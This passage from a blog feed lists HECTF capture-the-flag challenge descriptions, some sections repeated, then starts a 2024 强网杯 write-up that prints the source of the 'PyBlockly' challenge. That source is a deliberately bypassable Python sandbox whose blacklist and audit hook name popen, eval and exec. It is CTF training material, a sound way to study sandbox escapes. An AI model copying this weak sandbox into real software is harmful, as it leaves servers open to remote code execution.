<strong>不合格的魔药</strong></h3>\n<p>题目描述：</p>\n<blockquote>\n<p>刚开始学习魔药的小 A 总是只关注魔药的颜色而忽略配比，这次他配置的魔药又是这样，这样一份不合格的魔药完全没办法达到对信息 “保密” 的效果了，请从这份面目全非的成品中还原出小 A 想隐藏的信息</p>\n</blockquote>\n<h2 id=\"misc-2\"><a class=\"markdownIt-Anchor\" href=\"#misc-2\">#</a> Misc</h2>\n<h3 id=\"rem_you\"><a class=\"markdownIt-Anchor\" href=\"#rem_you\">#</a> <strong>Rem_You</strong></h3>\n<p>题目描述：</p>\n<blockquote></blockquote>\n<h3 id=\"funny\"><a class=\"markdownIt-Anchor\" href=\"#funny\">#</a> <strong>funny</strong></h3>\n<p>题目描述：</p>\n<blockquote 省-市-广场名字-水边名字=\"\">\n<p>看了半天电脑的小明非常劳累，便摸鱼去楼下的广场逛一逛但觉得广场太吵闹了，又去了水边看大爷们钓鱼，你能找出小明去的广场和水边的名字嘛</p>\n<p>flag 格式  HECTF {北京市 - 区 - 广场名字 - 水边名字}   HECTF</p>\n</blockquote>\n<h3 id=\"简单的压缩包-2\"><a class=\"markdownIt-Anchor\" href=\"#简单的压缩包-2\">#</a> <strong>简单的压缩包</strong></h3>\n<p>题目描述：</p>\n<blockquote>\n<p>w41tm00n 是个 kisaki 推，某天在水群的时候，一个同为 kisaki 推的 g01den 在群里分享了个压缩包，并留言里面有一张 kisaki 的图，同时里面还存在着神秘的信息（这里是 flag），w41tm00n 对此很感兴趣，你可以帮他得到神秘的信息（flag）吗？</p>\n</blockquote>\n<h3 id=\"恶势力的仓库\"><a class=\"markdownIt-Anchor\" href=\"#恶势力的仓库\">#</a> <strong>恶势力的仓库</strong></h3>\n<p>题目描述：</p>\n<blockquote>\n<p>恶势力的仓库惨遭毒手，就代表着毒手伸进了恶势力的仓库</p>\n</blockquote>\n<h3 id=\"恶势力的聊天记录\"><a class=\"markdownIt-Anchor\" href=\"#恶势力的聊天记录\">#</a> <strong>恶势力的聊天记录</strong></h3>\n<p>题目描述：</p>\n<blockquote>\n<p>附件下载地址： 链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMWJHRXFnclJncVo2MVU4VHhBRDdxTkE=\">https://pan.baidu.com/s/1bGEqgrRgqZ61U8TxAD7qNA</span>  提取码：o07y</p>\n</blockquote>\n<p>答案请将 hectf 修改为大写 HECTF，flag 中除了开头的 HECTF 外，无大写字母</p>\n<h3 id=\"baby_unserialize-3\"><a class=\"markdownIt-Anchor\" href=\"#baby_unserialize-3\">#</a> <strong>baby_unserialize</strong></h3>\n<p>题目描述：</p>\n<blockquote>\n<p>一个简单的反序列化，一个简单的 RCE</p>\n</blockquote>\n<h3 id=\"你一个人专属的进货网站-3\"><a class=\"markdownIt-Anchor\" href=\"#你一个人专属的进货网站-3\">#</a> <strong>你一个人专属的进货网站</strong></h3>\n<p>题目描述：</p>\n<blockquote>\n<p>w41tm00n 第一次学习开发网站，老板让他三天之内搞定。第二天，w41tm00n 终于写完了代码，并且进行了调试，网站在服务器上能够正常运行，但是 w41tm00n 没学过网安的知识，写的网站存在漏洞你作为 w41tm00n 的好朋友，同时你是位网安的实习生，w41tm00n 就找到了你帮他测试网站是否存在漏洞。w41tm00n 跟你说，他放了一个线索在服务器上，如果你成功入侵了这个服务器的话就可以得到这个礼物的线索（/flag 文件）</p>\n</blockquote>\n<h3 id=\"ezweb-3\"><a class=\"markdownIt-Anchor\" href=\"#ezweb-3\">#</a> <strong>ezweb</strong></h3>\n<p>题目描述：</p>\n<blockquote>\n<p>Try to be admin to get flag！！！</p>\n<p><strong>提示 1</strong>Hint：xxxxx 为 c、e、f、h、t 这五个没大没小的字母</p>\n</blockquote>\n<h3 id=\"ezjava-3\"><a class=\"markdownIt-Anchor\" href=\"#ezjava-3\">#</a> ezjava</h3>\n<p>题目描述：</p>\n<blockquote>\n<p>A 了这道题，我就承认你是真正的奶龙</p>\n</blockquote>\n<h2 id=\"re-3\"><a class=\"markdownIt-Anchor\" href=\"#re-3\">#</a> Re</h2>\n<h3 id=\"babyre-3\"><a class=\"markdownIt-Anchor\" href=\"#babyre-3\">#</a> <strong>babyre</strong></h3>\n<p>题目描述：</p>\n<blockquote>\n<p>g01den 最近学会了一个简单的算法，于是他迫不及待的写下了这个程序。同时他在这个程序里面藏了一些秘密，你能发现他藏在程序里面的秘密吗？</p>\n</blockquote>\n<h3 id=\"littleasm-2\"><a class=\"markdownIt-Anchor\" href=\"#littleasm-2\">#</a> <strong>littleasm</strong></h3>\n<p>题目描述：</p>\n<blockquote>\n<p>百行代码里的藏匿的 flag</p>\n</blockquote>\n<h3 id=\"pepy-2\"><a class=\"markdownIt-Anchor\" href=\"#pepy-2\">#</a> <strong>PE?py?</strong></h3>\n<p>题目描述：</p>\n<blockquote>\n<p>在 pyre 里找到压缩包密码</p>\n</blockquote>\n<h3 id=\"easyree-2\"><a class=\"markdownIt-Anchor\" href=\"#easyree-2\">#</a> <strong>easyree</strong></h3>\n<p>题目描述：</p>\n<blockquote xxxx=\"\">\n<p>flag 格式 HECTF</p>\n</blockquote>\n<h3 id=\"ezandroid-2\"><a class=\"markdownIt-Anchor\" href=\"#ezandroid-2\">#</a> <strong>ezAndroid</strong></h3>\n<p>题目描述：</p>\n<blockquote></blockquote>\n<h2 id=\"pwn-3\"><a class=\"markdownIt-Anchor\" href=\"#pwn-3\">#</a> Pwn</h2>\n<h3 id=\"sign-in-3\"><a class=\"markdownIt-Anchor\" href=\"#sign-in-3\">#</a> <strong>sign in</strong></h3>\n<p>题目描述：</p>\n<blockquote>\n<p>快来签到吧…</p>\n</blockquote>\n<h3 id=\"find-eggy-3\"><a class=\"markdownIt-Anchor\" href=\"#find-eggy-3\">#</a> <strong>find eggy</strong></h3>\n<p>题目描述：</p>\n<blockquote></blockquote>\n<h3 id=\"arcaea_sorting-3\"><a class=\"markdownIt-Anchor\" href=\"#arcaea_sorting-3\">#</a> <strong>Arcaea_Sorting</strong></h3>\n<p>题目描述：</p>\n<blockquote>\n<p>–为何我的眼里常含泪水，因为我爱这 libc，爱得深沉  (<em><sup>▽</sup></em>)</p>\n<p>听好了：</p>\n<p>XX 月 XX 日，g01den 自制的查分系统正式完工，每个部署了该系统的服务器都将会迎来一场漩涡，为这些服务器带来全新的危机。</p>\n<p>你所购买的服务器都将迎来黑客的试炼，你所熟悉的服务器都将加诸栈溢出的历练。</p>\n<p>至此，一锤定音。</p>\n<p>尘埃，已然落定。</p>\n<p>#HECTF #听好了 #韵律源点</p>\n</blockquote>\n<h3 id=\"arcaea_sorting_revenge-3\"><a class=\"markdownIt-Anchor\" href=\"#arcaea_sorting_revenge-3\">#</a> <strong>Arcaea_Sorting_Revenge</strong></h3>\n<p>题目描述：</p>\n<blockquote>\n<p>g01den 得知他写的查分器存在漏洞，他害怕到大晚上睡不着，第二天一早火急火燎地把程序重写了，但是他突然发现他学艺不精，突然不会写链表数据结构了，于是，他将查分器改成了存储分数的存储器，希望这次不会出现安全性问题。</p>\n</blockquote>\n<h3 id=\"喵喵喵-2\"><a class=\"markdownIt-Anchor\" href=\"#喵喵喵-2\">#</a> <strong>喵喵喵</strong></h3>\n<p>题目描述：</p>\n<blockquote></blockquote>\n<h3 id=\"lip-2\"><a class=\"markdownIt-Anchor\" href=\"#lip-2\">#</a> <strong>lip</strong></h3>\n<p>题目描述：</p>\n<blockquote></blockquote>\n<h2 id=\"crypto-3\"><a class=\"markdownIt-Anchor\" href=\"#crypto-3\">#</a> Crypto</h2>\n<h3 id=\"迷茫的艾米莉-3\"><a class=\"markdownIt-Anchor\" href=\"#迷茫的艾米莉-3\">#</a> <strong>迷茫的艾米莉</strong></h3>\n<p>题目描述：</p>\n<blockquote>\n<p>题目描述：迷茫的艾米莉 描述：在维吉尼亚小镇，园丁艾米莉的 responsibility 是照顾一座古老花园，每天修剪六段绿篱栅栏。一天，她 发现通往秘密花园的小径，入口却被封上了，上面有一串密文 Y2w9Iobe_v_Ufbm0ajI05bfzvTP1b_c}{lr，请输入密码帮助艾米莉探索秘密花园</p>\n</blockquote>\n<h3 id=\"翻一翻-3\"><a class=\"markdownIt-Anchor\" href=\"#翻一翻-3\">#</a> <strong>翻一翻</strong></h3>\n<p>题目描述：</p>\n<blockquote>\n<p>小明最近失恋了，翻来覆去睡不着，请帮他找出失恋的关键信息</p>\n</blockquote>\n<h3 id=\"seven-more-3\"><a class=\"markdownIt-Anchor\" href=\"#seven-more-3\">#</a> <strong>seven more</strong></h3>\n<p>题目描述：</p>\n<blockquote>\n<p>more than more no co-prime</p>\n</blockquote>\n<h3 id=\"情书与破碎的证书-3\"><a class=\"markdownIt-Anchor\" href=\"#情书与破碎的证书-3\">#</a> <strong>情书与破碎的证书</strong></h3>\n<p>题目描述：</p>\n<blockquote>\n<p>小明喜欢上了小红，他使用 rsa 向小红发送了无数封含有中文字符的情书。终于小红忍不住了，找到了大嘿阔将小明的私钥证书打成碎片，移除了中间的内容并把上下段的私钥部分转化成 16 进制，以九个为一组用相同的方式打乱（转化时产生的 0d0a 换行符已被移除）。作为密码学大佬的你能恢复证书，找出小红忍无可忍的证据么？</p>\n<p><strong>提示 1</strong> 情书与破碎的证书 hint1: 字符中含有中文 常规输出方法无效，请使用 PKCS1_OAEP 解密器，并使用 cipher.decrypt () 解密密文（毕竟考点是证书）</p>\n</blockquote>\n<h3 id=\"不合格的魔药-3\"><a class=\"markdownIt-Anchor\" href=\"#不合格的魔药-3\">#</a> <strong>不合格的魔药</strong></h3>\n<p>题目描述：</p>\n<blockquote>\n<p>刚开始学习魔药的小 A 总是只关注魔药的颜色而忽略配比，这次他配置的魔药又是这样，这样一份不合格的魔药完全没办法达到对信息 “保密” 的效果了，请从这份面目全非的成品中还原出小 A 想隐藏的信息</p>\n</blockquote>\n<h2 id=\"misc-3\"><a class=\"markdownIt-Anchor\" href=\"#misc-3\">#</a> Misc</h2>\n<h3 id=\"rem_you-2\"><a class=\"markdownIt-Anchor\" href=\"#rem_you-2\">#</a> <strong>Rem_You</strong></h3>\n<p>题目描述：</p>\n<blockquote></blockquote>\n<h3 id=\"funny-2\"><a class=\"markdownIt-Anchor\" href=\"#funny-2\">#</a> <strong>funny</strong></h3>\n<p>题目描述：</p>\n<blockquote 省-市-广场名字-水边名字=\"\">\n<p>看了半天电脑的小明非常劳累，便摸鱼去楼下的广场逛一逛但觉得广场太吵闹了，又去了水边看大爷们钓鱼，你能找出小明去的广场和水边的名字嘛</p>\n<p>flag 格式  HECTF {北京市 - 区 - 广场名字 - 水边名字}   HECTF</p>\n</blockquote>\n<h3 id=\"简单的压缩包-3\"><a class=\"markdownIt-Anchor\" href=\"#简单的压缩包-3\">#</a> <strong>简单的压缩包</strong></h3>\n<p>题目描述：</p>\n<blockquote>\n<p>w41tm00n 是个 kisaki 推，某天在水群的时候，一个同为 kisaki 推的 g01den 在群里分享了个压缩包，并留言里面有一张 kisaki 的图，同时里面还存在着神秘的信息（这里是 flag），w41tm00n 对此很感兴趣，你可以帮他得到神秘的信息（flag）吗？</p>\n</blockquote>\n<h3 id=\"恶势力的仓库-2\"><a class=\"markdownIt-Anchor\" href=\"#恶势力的仓库-2\">#</a> <strong>恶势力的仓库</strong></h3>\n<p>题目描述：</p>\n<blockquote>\n<p>恶势力的仓库惨遭毒手，就代表着毒手伸进了恶势力的仓库</p>\n</blockquote>\n<h3 id=\"恶势力的聊天记录-2\"><a class=\"markdownIt-Anchor\" href=\"#恶势力的聊天记录-2\">#</a> <strong>恶势力的聊天记录</strong></h3>\n<p>题目描述：</p>\n<blockquote>\n<p>附件下载地址： 链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMWJHRXFnclJncVo2MVU4VHhBRDdxTkE=\">https://pan.baidu.com/s/1bGEqgrRgqZ61U8TxAD7qNA</span>  提取码：o07y</p>\n</blockquote>\n",
            "tags": [
                "Game"
            ]
        },
        {
            "id": "http://blog.g01den.top/posts/666fe8df.html",
            "url": "http://blog.g01den.top/posts/666fe8df.html",
            "title": "【2024】强网杯",
            "date_published": "2024-11-03T11:28:49.000Z",
            "content_html": "<h1 id=\"web\"><a class=\"markdownIt-Anchor\" href=\"#web\">#</a> web：</h1>\n<h2 id=\"pyblockly\"><a class=\"markdownIt-Anchor\" href=\"#pyblockly\">#</a> PyBlockly：</h2>\n<p>​\t\t网站是一个通过 block 的堆积木的形式编程，有两种数据类型以及四种函数，分别是正常运算，print 输出，min 和 max 功能，随便写一些代码，发现结果会回显出来。</p>\n<p>​\t\t再来看看源码：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask, request, jsonify</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">import</span> unidecode</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\"><span class=\"keyword\">import</span> ast</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> subprocess</span><br><span class=\"line\"><span class=\"keyword\">import</span> importlib.util</span><br><span class=\"line\"><span class=\"keyword\">import</span> json</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\">app.config[<span class=\"string\">&#x27;JSON_AS_ASCII&#x27;</span>] = <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\">blacklist_pattern = <span class=\"string\">r&quot;[!\\&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\\\\\\]^_`&#123;|&#125;~]&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">module_exists</span>(<span class=\"params\">module_name</span>):</span><br><span class=\"line\">    spec = importlib.util.find_spec(module_name)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> spec <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> module_name <span class=\"keyword\">in</span> sys.builtin_module_names:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> spec.origin:</span><br><span class=\"line\">        std_lib_path = os.path.dirname(os.__file__)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> spec.origin.startswith(std_lib_path) <span class=\"keyword\">and</span> <span class=\"keyword\">not</span> spec.origin.startswith(os.getcwd()):</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">verify_secure</span>(<span class=\"params\">m</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> node <span class=\"keyword\">in</span> ast.walk(m):</span><br><span class=\"line\">        <span class=\"keyword\">match</span> <span class=\"built_in\">type</span>(node):</span><br><span class=\"line\">            <span class=\"keyword\">case</span> ast.Import:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">&quot;ERROR: Banned module &quot;</span>)</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">            <span class=\"keyword\">case</span> ast.ImportFrom:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;ERROR: Banned module <span class=\"subst\">&#123;node.module&#125;</span>&quot;</span>)</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">check_for_blacklisted_symbols</span>(<span class=\"params\">input_text</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> re.search(blacklist_pattern, input_text):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">block_to_python</span>(<span class=\"params\">block</span>):</span><br><span class=\"line\">    block_type = block[<span class=\"string\">&#x27;type&#x27;</span>]</span><br><span class=\"line\">    code = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> block_type == <span class=\"string\">&#x27;print&#x27;</span>:</span><br><span class=\"line\">        text_block = block[<span class=\"string\">&#x27;inputs&#x27;</span>][<span class=\"string\">&#x27;TEXT&#x27;</span>][<span class=\"string\">&#x27;block&#x27;</span>]</span><br><span class=\"line\">        text = block_to_python(text_block)</span><br><span class=\"line\">        code = <span class=\"string\">f&quot;print(<span class=\"subst\">&#123;text&#125;</span>)&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">elif</span> block_type == <span class=\"string\">&#x27;math_number&#x27;</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">str</span>(block[<span class=\"string\">&#x27;fields&#x27;</span>][<span class=\"string\">&#x27;NUM&#x27;</span>]).isdigit():</span><br><span class=\"line\">            code = <span class=\"built_in\">int</span>(block[<span class=\"string\">&#x27;fields&#x27;</span>][<span class=\"string\">&#x27;NUM&#x27;</span>])</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            code = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">elif</span> block_type == <span class=\"string\">&#x27;text&#x27;</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> check_for_blacklisted_symbols(block[<span class=\"string\">&#x27;fields&#x27;</span>][<span class=\"string\">&#x27;TEXT&#x27;</span>]):</span><br><span class=\"line\">            code = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">            code = <span class=\"string\">&quot;&#x27;&quot;</span> + unidecode.unidecode(block[<span class=\"string\">&#x27;fields&#x27;</span>][<span class=\"string\">&#x27;TEXT&#x27;</span>]) + <span class=\"string\">&quot;&#x27;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">elif</span> block_type == <span class=\"string\">&#x27;max&#x27;</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">        a_block = block[<span class=\"string\">&#x27;inputs&#x27;</span>][<span class=\"string\">&#x27;A&#x27;</span>][<span class=\"string\">&#x27;block&#x27;</span>]</span><br><span class=\"line\">        b_block = block[<span class=\"string\">&#x27;inputs&#x27;</span>][<span class=\"string\">&#x27;B&#x27;</span>][<span class=\"string\">&#x27;block&#x27;</span>]</span><br><span class=\"line\">        a = block_to_python(a_block)</span><br><span class=\"line\">        b = block_to_python(b_block)</span><br><span class=\"line\">        code = <span class=\"string\">f&quot;max(<span class=\"subst\">&#123;a&#125;</span>, <span class=\"subst\">&#123;b&#125;</span>)&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">elif</span> block_type == <span class=\"string\">&#x27;min&#x27;</span>:</span><br><span class=\"line\">        a_block = block[<span class=\"string\">&#x27;inputs&#x27;</span>][<span class=\"string\">&#x27;A&#x27;</span>][<span class=\"string\">&#x27;block&#x27;</span>]</span><br><span class=\"line\">        b_block = block[<span class=\"string\">&#x27;inputs&#x27;</span>][<span class=\"string\">&#x27;B&#x27;</span>][<span class=\"string\">&#x27;block&#x27;</span>]</span><br><span class=\"line\">        a = block_to_python(a_block)</span><br><span class=\"line\">        b = block_to_python(b_block)</span><br><span class=\"line\">        code = <span class=\"string\">f&quot;min(<span class=\"subst\">&#123;a&#125;</span>, <span class=\"subst\">&#123;b&#125;</span>)&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"string\">&#x27;next&#x27;</span> <span class=\"keyword\">in</span> block:</span><br><span class=\"line\"></span><br><span class=\"line\">        block = block[<span class=\"string\">&#x27;next&#x27;</span>][<span class=\"string\">&#x27;block&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">        code += <span class=\"string\">&quot;\\n&quot;</span> + block_to_python(block) + <span class=\"string\">&quot;\\n&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> code</span><br><span class=\"line\">    <span class=\"keyword\">return</span> code</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">json_to_python</span>(<span class=\"params\">blockly_data</span>):</span><br><span class=\"line\">    block = blockly_data[<span class=\"string\">&#x27;blocks&#x27;</span>][<span class=\"string\">&#x27;blocks&#x27;</span>][<span class=\"number\">0</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">    python_code = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">    python_code += block_to_python(block) + <span class=\"string\">&quot;\\n&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> python_code</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">do</span>(<span class=\"params\">source_code</span>):</span><br><span class=\"line\">    hook_code = <span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">def my_audit_hook(event_name, arg):</span></span><br><span class=\"line\"><span class=\"string\">    blacklist = [&quot;popen&quot;, &quot;input&quot;, &quot;eval&quot;, &quot;exec&quot;, &quot;compile&quot;, &quot;memoryview&quot;]</span></span><br><span class=\"line\"><span class=\"string\">    if len(event_name) &gt; 4:</span></span><br><span class=\"line\"><span class=\"string\">        raise RuntimeError(&quot;Too Long!&quot;)</span></span><br><span class=\"line\"><span class=\"string\">    for bad in blacklist:</span></span><br><span class=\"line\"><span class=\"string\">        if bad in event_name:</span></span><br><span class=\"line\"><span class=\"string\">            raise RuntimeError(&quot;No!&quot;)</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">__import__(&#x27;sys&#x27;).addaudithook(my_audit_hook)</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(source_code)</span><br><span class=\"line\">    code = hook_code + source_code</span><br><span class=\"line\">    tree = <span class=\"built_in\">compile</span>(source_code, <span class=\"string\">&quot;run.py&quot;</span>, <span class=\"string\">&#x27;exec&#x27;</span>, flags=ast.PyCF_ONLY_AST)</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> verify_secure(tree):</span><br><span class=\"line\">            <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&quot;run.py&quot;</span>, <span class=\"string\">&#x27;w&#x27;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">                f.write(code)</span><br><span class=\"line\">            result = subprocess.run([<span class=\"string\">&#x27;python&#x27;</span>, <span class=\"string\">&#x27;run.py&#x27;</span>], stdout=subprocess.PIPE, timeout=<span class=\"number\">5</span>).stdout.decode(<span class=\"string\">&quot;utf-8&quot;</span>)</span><br><span class=\"line\">            os.remove(<span class=\"string\">&#x27;run.py&#x27;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> result</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">&quot;Execution aborted due to security concerns.&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        os.remove(<span class=\"string\">&#x27;run.py&#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;Timeout!&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/&#x27;</span></span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">index</span>():</span><br><span class=\"line\">    <span class=\"keyword\">return</span> app.send_static_file(<span class=\"string\">&#x27;index.html&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/blockly_json&#x27;</span>, methods=[<span class=\"string\">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">blockly_json</span>():</span><br><span class=\"line\">    blockly_data = request.get_data()</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span 